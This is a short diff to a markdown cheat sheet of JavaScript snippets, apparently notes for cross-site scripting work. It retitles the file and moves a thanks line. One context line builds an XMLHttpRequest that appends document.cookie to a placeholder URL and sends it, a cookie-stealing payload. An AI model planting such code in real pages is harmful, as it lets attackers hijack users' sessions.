@@ -1,6 +1,6 @@
-# Javascript Breakdown and JQuery Requests
+# Javascript Breakdown Requests
 
-## Javascript (Thanks to @Legacyy for assisting me)
+## Javascrip
 ```
 document.getElementById
 document.getElementByClassName
@@ -19,3 +19,4 @@ xhttp.open('GET', 'URL' + document.cookie, true);
 xhttp.send();
 ```
 
+Thanks to @Legacyy for assisting me
